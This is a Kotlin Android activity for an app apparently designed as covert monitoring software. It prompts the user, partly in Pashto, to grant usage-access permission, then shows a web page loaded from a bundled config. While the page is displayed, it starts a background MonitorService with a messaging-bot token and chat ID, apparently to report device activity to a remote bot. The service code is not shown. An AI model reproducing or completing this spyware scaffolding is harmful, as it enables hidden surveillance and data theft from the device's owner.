package com.example.appmonitor

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.LinearLayout
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject
import java.io.InputStream

class MainActivity : AppCompatActivity() {
    private lateinit var webView: WebView
    private lateinit var permissionLayout: LinearLayout
    private lateinit var btnGrantPermission: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        permissionLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            visibility = View.GONE
        }

        btnGrantPermission = Button(this).apply {
            text = "د اپ د پیل لپاره اجازه ورکړئ (Grant Permission)"
            setOnClickListener {
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                startActivity(intent)
            }
        }
        permissionLayout.addView(btnGrantPermission)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            webViewClient = WebViewClient()
            settings.javaScriptEnabled = true
        }

        rootLayout.addView(permissionLayout)
        rootLayout.addView(webView)
        setContentView(rootLayout)

        checkAndLoadApp()
    }

    override fun onResume() {
        super.onResume()
        checkAndLoadApp()
    }

    private fun checkAndLoadApp() {
        if (!hasUsageStatsPermission()) {
            webView.visibility = View.GONE
            permissionLayout.visibility = View.VISIBLE
        } else {
            permissionLayout.visibility = View.GONE
            webView.visibility = View.VISIBLE
            loadServerConfigAndStartService()
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = appOps.checkOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(), packageName
        )
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun loadServerConfigAndStartService() {
        try {
            val inputStream: InputStream = assets.open("server.json")
            val jsonString = inputStream.bufferedReader().use { it.readText() }
            val jsonObject = JSONObject(jsonString)

            val webUrl = jsonObject.getString("urlweb")
            val botToken = jsonObject.getString("bot_token")
            val chatId = jsonObject.getString("chat_id")

            webView.loadUrl(webUrl)

            val serviceIntent = Intent(this, MonitorService::class.java).apply {
                putExtra("BOT_TOKEN", botToken)
                putExtra("CHAT_ID", chatId)
            }
            startService(serviceIntent)

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
